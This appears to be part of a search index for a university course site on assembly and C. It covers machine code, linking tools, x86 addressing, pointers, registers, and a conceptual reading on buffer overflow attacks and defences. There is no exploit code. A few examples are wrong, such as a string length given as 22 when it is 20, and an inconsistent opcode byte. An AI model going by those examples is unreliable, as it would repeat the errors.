    "url": "/labs/lab-02/reading/introduction-to-GDB.html#pwndbg",
    
    "relUrl": "/labs/lab-02/reading/introduction-to-GDB.html#pwndbg"
  },"230": {
    "doc": "Reading: Introduction",
    "title": "Reading: Introduction",
    "content": "Before we actually start learning to read code written in assembly language, and then write our first programs, we need to answer a few questions. ",
    "url": "/labs/lab-04/reading/introduction.html",
    
    "relUrl": "/labs/lab-04/reading/introduction.html"
  },"231": {
    "doc": "Reading: Introduction",
    "title": "What is the Assembly Language?",
    "content": "As you probably know, the basic role of a computer - specifically, of the processor - is to read, interpret, and execute instructions. These instructions are encoded in machine code. An example would be: . 1011000000001100011001100011000111011111111111100100 . This sequence of bits doesn’t tell us much in particular. We can convert it to hexadecimal to compress it and group it better. \\xB0\\x0C\\x66\\x31\\xD2\\xFF\\xE4 . Furthermore, for many of us, this sequence still doesn’t mean anything. Hence the need for a more understandable and usable language. Assembly language allows us to write text programs which will then be translated, through an utility called an assembler, specific to each architecture, into machine code. Most assembly languages provide a direct correspondence between instructions. For example: . mov al, 12 &lt;-&gt; '\\xB0\\x0C' xor dx, dx &lt;-&gt; '\\x67\\x31\\xD2' jmp esp &lt;-&gt; '\\xFF\\xE4' . NOTE: Because assembly language depends on architecture, it is generally not portable. Therefore, processor manufacturers have tried to keep the instructions unchanged from one generation to another, so that even when adding new processors to the line-up, they would maintain compatibility within the same processor family (for example, Intel processors 80286, 80386, 80486 etc. are all part of the generic Intel x86). ",
    "url": "/labs/lab-04/reading/introduction.html#what-is-the-assembly-language",
    
    "relUrl": "/labs/lab-04/reading/introduction.html#what-is-the-assembly-language"
  },"232": {
    "doc": "Reading: Introduction",
    "title": "Why Learn Assembly Language?",
    "content": "Besides the very high didactic value, in which you understand what “stack overflow” consists of, data representation, and what is specific to the processor you are working with, there are a few applications where knowledge of assembly language and, implicitly, architecture are necessary or even critical. Debugging . It’s quite likely that at least one of the programs you’ve written in the past generated the following result: . Segmentation fault . Sometimes, you will encounter a series of data similar to the following: . Page Fault cr2=10000000 at eip e75; flags=6 eax=00000030 ebx=00000000 ecx=0000000c edx=00000000 esi=0001a44a edi=00000000 ebp=00000000 esp=00002672 cs=18 ds=38 es=af fs=0 gs=0 ss=20 error=0002 . For someone who knows assembly language, it’s relatively easy to begin troubleshooting using a debugger like GDB or OllyDbg, because the message provides almost all the information they need. Code Optimization . Think about how you would write a C program to perform AES encryption and decryption. Then, inform the compiler that you want to optimize your code. Evaluate the performance of that code (size, execution time, number of jump instructions, etc.). Although compilers are often labeled as “black magic”, there are situations where you simply know something about the processor you’re working with better than they do. Furthermore, just understanding assembly code is enough to evaluate a code and optimize its critical sections. Even if you don’t write code in assembly language, you’ll be aware of the code generated from the C instructions you use. Reverse Engineering . A large portion of common applications are closed-source. All you have when it comes to these applications is a pre-compiled binary file. Some of these may contain malicious code, in which case they need to be analyzed in a controlled environment (malware analysis/research). Embedded and Others . There are cases where constraints on code and/or data size are imposed, such as specialized devices for a single task, with little memory. This category includes drivers for devices. Fun . For more details, discuss with your laboratory assistant to share his personal experience with assembly language and practical use cases. ",
    "url": "/labs/lab-04/reading/introduction.html#why-learn-assembly-language",
    
    "relUrl": "/labs/lab-04/reading/introduction.html#why-learn-assembly-language"
  },"233": {
    "doc": "Reading: Linking",
    "title": "Reading: Linking",
    "content": "Linking is the final phase of the building process. Linking combines multiple object files into an executable file. To obtain an executable file from object files, the linker performs the following actions: . | Symbol resolution: locating the undefined symbols of one object file in other object files. | Section merging: merging sections of the same type from different object files into a single section in the executable file. | Address binding: after merging, the effective address symbols within the executable file can be established. | Symbol relocation: once the symbol addresses are set, the instructions and data referring to those addresses in the executable must be updated. | Entry point establishment: specifying the address of the first instruction to be executed. | . ",
    "url": "/labs/lab-11/reading/linking.html",
    
    "relUrl": "/labs/lab-11/reading/linking.html"
  },"234": {
    "doc": "Reading: Linking",
    "title": "Linker Invocation",
    "content": "The linker is generally invoked by the compilation utility (gcc, clang, cl). Thus, invoking the linker is transparent to the user. In specific cases, such as creating a kernel image or images for embedded systems, the user will invoke the linker directly. If we have a source C file app.c, we will use the compiler to obtain the object file app.o: . gcc -c -o app.o app.c . Then, to obtain the executable file app from the object file app.o, we use the gcc utility again: . gcc -o app app.o . In the background, gcc will invoke the linker and build the executable app. The linker will also link against the standard C library (libc). The linking process will work only if the file app.c has the main() function defined, which is the main function of the program. Linked files must have a single main() function in order to produce an executable. If we have multiple C source files, we invoke the compiler for each file and then the linker: . gcc -c -o helpers.o helpers.c gcc -c -o app.o app.c gcc -o app app.o helpers.o . The last command is the linking command, which links the object files app.o and helpers.o into the executable file app. In the case of C++ source files, we will use the g++ command: . g++ -c -o helpers.o helpers.cpp g++ -c -o app.o app.cpp g++ -o app app.o helpers.o . We can also use the gcc command for linking, specifying linking with the standard C++ library (libc++): . gcc -o app app.o helpers.o -lstdc++ . The Linux linking utility, ld, is invoked transparently by gcc or g++. To see how the linker is invoked, we use the -v option of the gcc utility, with the following output: . /usr/lib/gcc/x86_64-linux-gnu/7/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/7/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper -plugin-opt=-fresolution=/tmp/ccwnf5NM.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_i386 --hash-style=gnu --as-needed -dynamic-linker /lib/ld-linux.so.2 -z relro -o hello /usr/lib/gcc/x86_64-linux-gnu/7/../../../i386-linux-gnu/crt1.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../i386-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/7/32/crtbegin.o -L/usr/lib/gcc/x86_64-linux-gnu/7/32 -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../i386-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../../lib32 -L/lib/i386-linux-gnu -L/lib/../lib32 -L/usr/lib/i386-linux-gnu -L/usr/lib/../lib32 -L/usr/lib/gcc/x86_64-linux-gnu/7 -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../i386-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/7/../../.. -L/lib/i386-linux-gnu -L/usr/lib/i386-linux-gnu hello.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/7/32/crtend.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../i386-linux-gnu/crtn.o COLLECT_GCC_OPTIONS='-no-pie' '-m32' '-v' '-o' 'hello' '-mtune=generic' '-march=i686' . The collect2 utility is, in fact, a wrapper around the ld utility. The result of running the command is complex. A “manual” invocation of the ld command would look like this: . ld -dynamic-linker /lib/ld-linux.so.2 -m elf_i386 -o app /usr/lib32/crt1.o /usr/lib32/crti.o app.o helpers.o -lc /usr/lib32/crtn.o . The arguments of the above command have the following meanings: . | -dynamic-linker /lib/ld-linux.so.2: specifies the dynamic loader/linker used for loading the dynamic executable | -m elf_i386: links files for the x86 architecture (32-bit, i386) | /usr/lib32/crt1.o, /usr/lib32/crti.o, /usr/lib32/crtn.o: represent the C runtime library (crt - C runtime) that provides the necessary support for loading the executable | -lc: links against standard C library (libc) | . ",
    "url": "/labs/lab-11/reading/linking.html#linker-invocation",
    
    "relUrl": "/labs/lab-11/reading/linking.html#linker-invocation"
  },"235": {
    "doc": "Reading: Linking",
    "title": "File Inspection",
    "content": "To track the linking process, we use static analysis utilities such as nm, objdump, and readelf. We use the nm utility to display symbols from an object file or an executable file: . $ nm hello.o 00000000 T main U puts $ nm hello 0804a01c B __bss_start 0804a01c b completed.7283 0804a014 D __data_start 0804a014 W data_start 08048370 t deregister_tm_clones 08048350 T _dl_relocate_static_pie 080483f0 t __do_global_dtors_aux 08049f10 t __do_global_dtors_aux_fini_array_entry 0804a018 D __dso_handle 08049f14 d _DYNAMIC 0804a01c D _edata 0804a020 B _end 080484c4 T _fini 080484d8 R _fp_hw 08048420 t frame_dummy 08049f0c t __frame_dummy_init_array_entry 0804861c r __FRAME_END__ 0804a000 d _GLOBAL_OFFSET_TABLE_ w __gmon_start__ 080484f0 r __GNU_EH_FRAME_HDR 080482a8 T _init 08049f10 t __init_array_end 08049f0c t __init_array_start 080484dc R _IO_stdin_used 080484c0 T __libc_csu_fini 08048460 T __libc_csu_init U __libc_start_main@@GLIBC_2.0 08048426 T main U puts@@GLIBC_2.0 080483b0 t register_tm_clones 08048310 T _start 0804a01c D __TMC_END__ 08048360 T __x86.get_pc_thunk.bx . The nm command displays three columns: . | the symbol’s address | the section and type where the symbol is located | the symbol’s name | . A symbol is the name of a global variable or function. It is used by the linker to make connections between different object modules. Symbols are not necessary for executables, which is why executables can be stripped. The symbol’s address is actually the offset within a section for object files and is the effective address for executables. The second column specifies the section and type of the symbol. If it is uppercase, then the symbol is exported and can be used by another module. If it is lowercase, then the symbol is not exported and is local to the object module, making it unusable in other modules. Thus: . | d: the symbol is in the initialized data area (.data), unexported | D: the symbol is in the initialized data area (.data), exported | t: the symbol is in the code area (.text), unexported | T: the symbol is in the code area (.text), exported | r: the symbol is in the read-only data area (.rodata), unexported | R: the symbol is in the read-only data area (.rodata), exported | b: the symbol is in the uninitialized data area (.bss), unexported | B: the symbol is in the uninitialized data area (.bss), exported | U: the symbol is undefined (it is used in the current module but defined in another module) | . More information can be found in the manual page for the nm utility. Using the objdump command, we can disassemble the code of object files and executables. This way, we can see the assembly code and how the modules operate. The readelf command is used to inspect object or executable files. With the readelf command, we can view the headers of files. An important piece of information in the header of executable files is the entry point, the address of the first instruction executed: . $ readelf -h hello ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x8048310 Start of program headers: 52 (bytes into file) Start of section headers: 8076 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 9 Size of section headers: 40 (bytes) Number of section headers: 35 Section header string table index: 34 . Using the readelf command, we can see the sections of an executable/object file: . $ readelf -S hello There are 35 section headers, starting at offset 0x1f8c: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [...] . Also, with the readelf command, we can list (dump) the contents of a specific section: . $ readelf -x .rodata hello Hex dump of section '.rodata': 0x080484d8 03000000 01000200 48656c6c 6f2c2057 ........Hello, W 0x080484e8 6f726c64 2100 orld!. ",
    "url": "/labs/lab-11/reading/linking.html#file-inspection",
    
    "relUrl": "/labs/lab-11/reading/linking.html#file-inspection"
  },"236": {
    "doc": "Reading: Memory Addressing",
    "title": "Reading: Memory Addressing",
    "content": "Modern x86 processors can address up to 2^32 bytes of memory, which means memory addresses are represented on 32 bits. To address memory, the processor uses addresses (implicitly, each label is translated into a corresponding memory address). Besides labels, there are other forms of addressing memory: . mov eax, [0xcafebab3] ; direct (displacement) mov eax, [esi] ; indirect (base) mov eax, [ebp-8] ; based (base + displacement) mov eax, [ebx*4 + 0xdeadbeef] ; indexed (index * scale + displacement) mov eax, [edx + ebx + 12] ; based and indexed without scale (base + index + displacement) mov eax, [edx + ebx*4 + 42] ; based and indexed with scale (base + index * scale + displacement) . WARNING: The following addressing modes are invalid: . mov eax, [ebx-ecx] ; Registers can only be added mov [eax+esi+edi], ebx ; The address calculation can involve at most 2 registers . ",
    "url": "/labs/lab-05/reading/memory-addressing.html",
    
    "relUrl": "/labs/lab-05/reading/memory-addressing.html"
  },"237": {
    "doc": "Reading: Memory Addressing",
    "title": "Size Directives",
    "content": "Generally, the size of a value brought from memory can be inferred from the instruction code used. For example, in the above addressing modes, the size of the values could be inferred from the size of the destination register, but in some cases, this is not so obvious. Let’s consider the following instruction: . mov [ebx], 2 . As seen, it intends to store the value 2 at the address contained in the ebx register. The size of the register is 4 bytes. The value 2 can be represented on both 1 and 4 bytes. In this case, since both interpretations are valid, the processor needs additional information on how to treat this value. This can be done through size directives: . mov byte [ebx], 2 ; Move the value 2 into the byte at the address contained in ebx. mov word [ebx], 2 ; Move the entire 2 represented in 16 bits into the 2 bytes ; starting from the address contained in ebx. mov dword [ebx], 2 ; Move the entire 2 represented in 32 bits into the 4 bytes ; starting from the address contained in ebx. ",
    "url": "/labs/lab-05/reading/memory-addressing.html#size-directives",
    
    "relUrl": "/labs/lab-05/reading/memory-addressing.html#size-directives"
  },"238": {
    "doc": "Reading: Memory Addressing",
    "title": "Loop Instruction",
    "content": "The loop instruction is used for loops with a predetermined number of iterations, loaded into the ecx register. Its syntax is as follows: . mov ecx, 10 ; Initialize ecx with the number of iterations label: ; loop content loop label . At each iteration, the ecx register is decremented, and if it’s not equal to 0, the execution jumps to the specified label. There are other forms of the instruction that additionally check the ZF flag: . | Mnemonic | Description | . | loope/loopz label | Decrement ecx, jump to label if ecx != 0 and ZF == 1 | . | loopne/loopnz label | Decrement ecx, jump to label if ecx != 0 and ZF != 1 | . NOTE: When using jumps in an assembly language program, it’s important to consider the difference between a short jump (near jump) and a long jump (far jump). | Type and example | Size and significance | Description | . | Short Jump (loop) | 2 bytes (one byte for the opcode and one for the address) | The relative address of the instruction to which the jump is intended must not be more than 128 bytes away from the current instruction address. | . | Long Jump (jmp) | 3 bytes (one byte for the opcode and two for the address) | The relative address of the instruction to which the jump is intended must not be more than 32768 bytes away from the current instruction address. | . ",
    "url": "/labs/lab-05/reading/memory-addressing.html#loop-instruction",
    
    "relUrl": "/labs/lab-05/reading/memory-addressing.html#loop-instruction"
  },"239": {
    "doc": "Reading: C - Assembly Interaction: Memory Perspective",
    "title": "Reading: C - Assembly Interaction: Memory Perspective",
    "content": "Considering that assembly language poses challenges both in reading and in developing code, the general trend is to migrate towards high-level languages (which are much easier to read and provide a more user-friendly API). However, there are still situations where, for optimization reasons, small assembly routines are used and integrated into the high-level language module. In this laboratory, we will explore how assembly modules can be integrated into C programs and vice versa. ",
    "url": "/labs/lab-09/reading/memory-layout-c-asm.html",
    
    "relUrl": "/labs/lab-09/reading/memory-layout-c-asm.html"
  },"240": {
    "doc": "Reading: C - Assembly Interaction: Memory Perspective",
    "title": "Using Assembly Procedures in C Functions",
    "content": "Using assembly procedures in C functions for a C program to be executed, it must be translated into the machine code of the processor; this is the task of a compiler. Since this compiled code is not always optimal, in some cases it is preferable to replace portions of code written in C with portions of assembly code that do the same thing, but with better performance. Declaration of the Procedure . In order to ensure that the assembly procedure and Module C are properly combined and compatible, the following steps must be followed: . | declare the procedure label as global, using the GLOBAL directive. In addition to this, any data that will be used by the procedure must be declared as global. | using the extern directive to declare procedures and global data as external. | . ",
    "url": "/labs/lab-09/reading/memory-layout-c-asm.html#using-assembly-procedures-in-c-functions",
    
    "relUrl": "/labs/lab-09/reading/memory-layout-c-asm.html#using-assembly-procedures-in-c-functions"
  },"241": {
    "doc": "Reading: C - Assembly Interaction: Memory Perspective",
    "title": "Calling C Functions from Assembly Procedures",
    "content": "In most cases, calling routines or functions from the standard C library in an assembly language program is a much more complex operation than vice versa. Take the example of calling the printf() function from an assembly language program: . global main extern printf section .data text db \"291 is the best!\", 10, 0 strformat db \"%s\", 0 section .code main: push dword text push dword strformat call printf add esp, 8 ret . Note that the procedure is declared as global and is called main - the starting point of any C program. Since in C the parameters are stacked in reverse order, the string offset is set first, followed by the format string offset. The C function can be called afterwards, but the stack must be restored when the function exits. When linking assembly code the standard C library (or the library containing the functions you use) must be included. ",
    "url": "/labs/lab-09/reading/memory-layout-c-asm.html#calling-c-functions-from-assembly-procedures",
    
    "relUrl": "/labs/lab-09/reading/memory-layout-c-asm.html#calling-c-functions-from-assembly-procedures"
  },"242": {
    "doc": "Reading: Pointers",
    "title": "Reading: Pointers",
    "content": "In the C programming language, memory interaction is achieved through pointers. We remind you that a pointer is a variable that holds a memory address. The general declaration form is as follows: type *variable_name, where type can represent any valid data type in C. WARNING: The asterisk (*) used in declaring a pointer denotes that it is a pointer and should not be confused with the dereference operator. These are two entirely different concepts represented by the same symbol. Declaring a pointer does not mean allocating a memory area to store data. A pointer is also a data type, whose value is a number representing a memory address. The size of the pointer data type is always the same, regardless of the type of data it points to, and is determined by the architecture and operating system on which the program was compiled (but usually 4 bytes on 32-bit systems and 8 bytes on 64-bit systems). int *p = 0xCAFEBABE; /* Declaring a pointer */ int x = *p; /* The value at the address stored in p */ . In C, a pointer can represent: . | The address of data of a certain type | The address of a memory area | The address of a function | The address where data of an unknown type is held (void pointer) | . TIP: The size of a pointer depends on the architecture and operating system on which the program was compiled. The size of a pointer is determined by sizeof(void*) and is not necessarily equal to the size of an int. ",
    "url": "/labs/lab-02/reading/memory-operations.html",
    
    "relUrl": "/labs/lab-02/reading/memory-operations.html"
  },"243": {
    "doc": "Reading: Pointers",
    "title": "Pointer Operations and Pointer Arithmetic",
    "content": "Arithmetic operations on pointers are slightly different from those on integer data types. The only valid operations are incrementing or decrementing a pointer, adding or subtracting an integer from a pointer, and subtracting two pointers of the same type. The behavior of these operations is influenced by the data type to which the pointers refer. When incrementing a pointer related to a data type T, the address is not increased by 1 but by the value sizeof(T), which ensures addressing the next object of the same type. Similarly, adding an integer n to a pointer p (thus the operation p + n) actually represents p + n * sizeof(*p). For example: . char *char_ptr = 1000; short *short_ptr = 2000; int *int_ptr = 3000; ++char_ptr; /* char_ptr will point to address 1001 */ ++short_ptr; /* short_ptr points to address 2002 */ ++int_ptr; /* int_ptr points to address 3004 */ . Subtracting two pointers is possible only if both have the same type. The result of the subtraction is obtained by calculating the difference between the memory addresses they point to. For example, calculating the length of a string: . char *s = \"Learn HSI, you must!\"; char *p = s; for (; *p != 0; ++p); /* Iterating character by character until '\\0' */ printf(\"%ld\", p - s); /** It will display 22, the length of the string * referenced by `s`. */ . Interpreting Data in Memory . On most modern computers, the smallest unit of data that can be addressed is the byte (8 bits), meaning that we can view data in memory as a sequence of bytes, each with its own address. As mentioned in the previous lab, when we want to store information represented by multiple bytes, we need to consider the order imposed by the system architecture, called endianness. Below is the mechanism for extracting data from memory on a little-endian architecture: . int n = 0xCAFEBABE; unsigned char first_byte = *((unsigned char*) &amp;n); /* Extracting the first byte of n */ unsigned char second_byte = *((unsigned char*) &amp;n + 1); /* Extracting the second byte of n */ printf(\"0x%x, 0x%x\\n\", first_byte, second_byte); /* It will display 0xBE, 0xBA */ . NOTE: For casted pointers, arithmetic operations are performed on the type to which they have been cast. WARNING: Do not confuse *p++ with (*p)++. In the first case, it increments the address pointed by p, while in the second case, it increments the value at that address. Arithmetic on pointers of type void is not possible due to the lack of a concrete data type they point to. Pointers to Arrays . There is a very close relationship between pointers and arrays. In C, the name of an array is a constant pointer (its address is allocated by the compiler and cannot be modified during execution) to the first element of the array: v = &amp;v[0]. For example: . int v[10], *p; p = v; ++p; /* Correct */ ++v; /* ERROR */ . Arrays are stored in a continuous block of memory, so pointer arithmetic works the same way for arrays as well. Here are some equivalences: . v[0] &lt;==&gt; *v v[1] &lt;==&gt; *(v + 1) v[n] &lt;==&gt; *(v + n) &amp;v[0] &lt;==&gt; v &amp;v[1] &lt;==&gt; v + 1 &amp;v[n] &lt;==&gt; v + n . Additionally, an array also contains information about its length and the total size occupied in memory, so sizeof(v) will return the space occupied in memory (number of bytes), and sizeof(v) / sizeof(*v) will return the number of elements in v. Using pointers, we can dynamically allocate memory. In this sense, dynamic allocation of a two-dimensional array (a matrix) can be done as follows: . The traditional method, where we allocate an array of pointers to pointers: . int **array1 = malloc(nrows * sizeof(*array1)); for (i = 0; i &lt; nrows; ++i) array1[i] = malloc(ncolumns * sizeof(**array1)); . If we want to keep the array in a continuous block of memory: . int **array2 = malloc(nrows * sizeof(*array2)); array2[0] = malloc(nrows * ncolumns * sizeof(**array2)); for (i = 1; i &lt; nrows; ++i) array2[i] = array2[0] + i * ncolumns; . Below is the difference between the two approaches: . In both cases, the elements of the matrix can be accessed using the indexing operator []: arrayX[i][j]. Also, just like with vectors, we can replace indexing with pointer operations. Thus, arr[i][j] = *(arr + i)[j] = *(*(arr + i) + j). WARNING: Whenever you allocate memory using a pointer, use p = malloc(n * sizeof(*p)) instead of p = malloc(n * sizeof(int)). Using sizeof(*p) makes the code more robust and self-documenting, so anyone reading the code will see that the correct number of bytes is being allocated without needing to check the data type that p is pointing to. ",
    "url": "/labs/lab-02/reading/memory-operations.html#pointer-operations-and-pointer-arithmetic",
    
    "relUrl": "/labs/lab-02/reading/memory-operations.html#pointer-operations-and-pointer-arithmetic"
  },"244": {
    "doc": "Reading: Pointers",
    "title": "Structures and Pointers to Structures",
    "content": "Structures are data types in which we can group multiple variables, possibly of different types (unlike arrays, which contain only data of the same type). A structure can be defined as follows: . struct struct_name { field_declarations }; . For simplifying declarations, we can associate a structure with a data type name: typedef struct {field_declarations} struct_name; . typedef struct student { char *name; int year; float grade; } Student; int main() { Student s; s.name = (char *) malloc(20 * sizeof(*s.name)); s.year = 3; return 0; } . Accessing members of a structure is done using the . operator. In the case of pointers to structures, accessing members is done by dereferencing the pointers: . Student *s = (Student *) malloc(sizeof(*s)); (*s).year = 3; /* In practice, to ease writing, the \"-&gt;\" operator is used */ s-&gt;year = 4; . The size of a structure is not always equal to the sum of the sizes of its fields. This happens because of padding added by the compiler to ensure proper memory alignment. Padding is added after a structure member followed by another member with a larger size, or at the end of the structure. struct A { /* sizeof(int) = 4 */ int x; /* Padding with 4 bytes */ /* sizeof(double) = 8 */ double z; /* sizeof(short) = 2 */ short y; /* Padding with 6 bytes */ }; printf(\"Size of struct: %zu\", sizeof(struct A)) /* Will print 24 */ . The red portion represents the padding added by the compiler, and the green parts represent the structure’s members. However, we can prevent the compiler from adding padding by using __attribute__((packed)) when declaring the structure (More details about this in the Computer Communication Protocols course). Thus, for the previous example, the result would be 14. NOTE: If you declare pointers to structures, don’t forget to allocate memory for them before accessing the structure fields. Also, remember to allocate and initialize structure fields that are pointer types before using them. Also, pay attention to how you access structure fields. ",
    "url": "/labs/lab-02/reading/memory-operations.html#structures-and-pointers-to-structures",
    
    "relUrl": "/labs/lab-02/reading/memory-operations.html#structures-and-pointers-to-structures"
  },"245": {
    "doc": "Reading: Pointers",
    "title": "Void Pointers",
    "content": "Memory can be seen as an array of bytes, accessible through pointers. By the type of the pointer, the addressed memory area gains a certain interpretation, as discussed above. There are cases where we want to address a zone of this ‘array’ in a generic way, thus requiring void pointers. A pointer to void is a pointer that does not have an associated type. Void pointers have a high flexibility because they can point to any type of data, but they also have a limitation in that they cannot be dereferenced, and to be used in pointer operations, they need to be converted to a known data type. They are most commonly used in the implementation of generic functions. For example, the functions malloc() and calloc() return a pointer to void, allowing these functions to be used for memory allocation for any data type. An example of using void pointers is as follows: . #include &lt;stdio.h&gt; void increment(void *data, int element_size) { /* Check if the data entered is a char */ if (element_size == sizeof(char)) { /* As mentioned, to be dereferenced, * a void pointer needs to be cast */ char *char_ptr = data; ++(*char_ptr); } if (element_size == sizeof(int)) { int *int_ptr = data; ++(*int_ptr); } } int main() { char c = 'a'; int x = 10; increment(&amp;c, sizeof(c)); increment(&amp;x, sizeof(x)); printf(\"%c, %d\\n\", c, x); /* Will print: b, 11 */ return 0; } . NOTE: In C, it is not necessary to explicitly cast the assignment of a pointer of type T with a void* pointer. Example (Good practice): . int *array = malloc(sizeof(*array) * number_of_elements); . NOT like this: . int *array = (int*) malloc(sizeof(*array) * number_of_elements); . ",
    "url": "/labs/lab-02/reading/memory-operations.html#void-pointers",
    
    "relUrl": "/labs/lab-02/reading/memory-operations.html#void-pointers"
  },"246": {
    "doc": "Reading: Pointers",
    "title": "Pointers in Functions and Function Pointers",
    "content": "Within functions, pointers can be used for: . | Passing results through arguments | Passing an address through the function’s return | Passing other functions and subsequently using them | . A function that needs to modify multiple values passed through arguments or that needs to transmit multiple calculated results within the function should use pointer arguments. #include &lt;stdio.h&gt; void swap(int *a, int *b) { int c = *a; *a = *b; *b = c; } int main() { int a = 3, b = 5; swap(&amp;a, &amp;b); printf(\"a = %d, b = %d\\n\", a, b); /* Will print a = 5, b = 3 */ return 0; } . A function can return a pointer, but this pointer cannot contain the address of a local variable. Most of the time, the result is one of the arguments, possibly modified within the function. For example: . char* toUpper(char *s) { /* Takes a string and returns the string in uppercase */ for (int i = 0 ; s[i] ; ++i) { if (s[i] &gt;= 'a' &amp;&amp; s[i] &lt;= 'z') { s[i] -= 32; } } return s; } . If a function returns the address of a local variable, it must be static. The lifetime of a local variable ends when the execution of the function in which it was defined ends, and therefore the address of such a variable should not be passed outside the function. The name of a function represents the memory address at which the function begins. A function pointer is a variable that stores the address of a function that can be called later through that pointer. Usually, function pointers are used to pass a function as a parameter to another function. The declaration of a function pointer is done as follows: type (*pf) (formal_parameter_list) . Why is it necessary to use extra parentheses? Without them, we would be talking about a function that returns a pointer. Below are two examples of using function pointers: . int add(int a, int b) { return a + b; } int subtract(int a, int b) { return a - b; } int operation(int x, int y, int (*func) (int, int)) { return func(x, y); } int main() { int (*minus)(int, int) = subtract; printf(\"%d\", operation(10, 5, minus)); /* Will print 5 */ return 0; } . The qsort() function from stdlib.h uses a function pointer as a comparator. int compare(const void *a, const void *b) { return *(int *) a - *(int *)b; } int main() { int v[] = {100, 5, 325, 1, 30}; int size = sizeof(v) / sizeof(*v); qsort(v, size, sizeof(*v), compare); for (int i = 0 ; i &lt; size ; ++i) { printf(\"%d \", v[i]); } return 0; } . ",
    "url": "/labs/lab-02/reading/memory-operations.html#pointers-in-functions-and-function-pointers",
    
    "relUrl": "/labs/lab-02/reading/memory-operations.html#pointers-in-functions-and-function-pointers"
  },"247": {
    "doc": "Reading: Buffer Overflow Attacks",
    "title": "Reading: Buffer Overflow Attacks",
    "content": " ",
    "url": "/labs/lab-10/reading/overflow-vuln.html",
    
    "relUrl": "/labs/lab-10/reading/overflow-vuln.html"
  },"248": {
    "doc": "Reading: Buffer Overflow Attacks",
    "title": "How is Buffer Overflow Used?",
    "content": "Buffer overflow can be exploited by a potential attacker to overwrite certain data within a program, affecting the execution flow and providing specific benefits to the attacker. Most often, an attacker initiates a buffer overflow attack with the goal of gaining access to confidential data that a normal user would not typically have access to. Buffer overflow attacks are generally used on static buffers stored at the stack level. This is because the stack, in addition to program data, also stores return addresses following function calls (see laboratory 7). These addresses can be overwritten through a buffer overflow attack, in which case the program’s execution flow can be altered. By overwriting the return address, upon completion of the current function’s execution, the program will not return to the calling function’s execution but will instead “jump” to another address within the executable where execution will continue. This event can lead to undefined behavior of the program if the jump address has not been calculated correctly. The goal of an attacker is to take control of a system by gaining access to a shell from which they can run commands. This can be achieved by overwriting the return address, using a system call through which a shell can be opened on the system where the executable is running (more details in the OS course). ",
    "url": "/labs/lab-10/reading/overflow-vuln.html#how-is-buffer-overflow-used",
    
    "relUrl": "/labs/lab-10/reading/overflow-vuln.html#how-is-buffer-overflow-used"
  },"249": {
    "doc": "Reading: Buffer Overflow Attacks",
    "title": "How Do We Protect Against Buffer Overflow Attacks?",
    "content": "There are many ways to protect an executable from these types of attacks, most of which you will study in detail in the OS course next year. A good practice against this type of attack is to avoid using insecure functions, such as those mentioned above. More details on best practices against buffer overflow attacks can be found here. Often, best practices prove to be insufficient in the “battle” against hackers, which is why several executable protection mechanisms have been invented by manipulating the code and its position within the executable (Position Independent Code - PIC), through address randomization (Address Space Layout Randomization - ASLR), or by introducing additional checks in the code to detect potential attacks. These checks are performed by introducing special values, called canaries, on the stack between the buffer and the function’s return address. These values are generated and placed within the executable by the compiler and differ with each run of the executable. When an attacker tries to overwrite the return address, they will also overwrite the canary value, and before exiting the current function call, it will be checked whether that value has been modified or not. If it has been modified, it means that a buffer overflow has occurred, and the program execution will be interrupted. This mechanism is called Stack Smashing Protection or Stack Guard. More details about Stack Guard and buffer overflow attacks can be found here. ",
    "url": "/labs/lab-10/reading/overflow-vuln.html#how-do-we-protect-against-buffer-overflow-attacks",
    
    "relUrl": "/labs/lab-10/reading/overflow-vuln.html#how-do-we-protect-against-buffer-overflow-attacks"
  },"250": {
    "doc": "Reading: Registers",
    "title": "Reading: Registers",
    "content": "Registers are the primary “tools” used to write programs in assembly language. They are like variables built into the processor. Using registers instead of direct memory addressing makes developing and reading assembly-written programs faster and easier. The only disadvantage of programming in x86 assembly language is that there are few registers. Modern x86 processors have 8 general-purpose registers whose size is 32 bits. The names of the registers are of historical nature (for example: eax was called the accumulator register because it is used by a series of arithmetic instructions, such as idiv). While most registers have lost their special purpose, becoming “general purpose” in the modern ISA (eax, ebx, ecx, edx, esi, edi), by convention, 2 have retained their initial purpose: esp (stack pointer) and ebp (base pointer). ",
    "url": "/labs/lab-05/reading/registers.html",
    
    "relUrl": "/labs/lab-05/reading/registers.html"
  },"251": {
    "doc": "Reading: Registers",
    "title": "Register Subsections",
    "content": "In certain cases, we want to manipulate values that are represented in less than 4 bytes (for example, working with character strings). For these situations, x86 processors offer us the possibility to work with subsections of 1 and 2 bytes of the eax, ebx, ecx, edx registers. The image below represents the registers, their subsections, and their sizes. WARNING: Subsections are part of registers, which means that if we modify a register, we implicitly modify the value of the subsection. NOTE: Subsections are used in the same way as registers, only the size of the retained value is different. NOTE: Besides the basic registers, there are also six segment registers corresponding to certain areas as seen in the image: . ",
    "url": "/labs/lab-05/reading/registers.html#register-subsections",
    
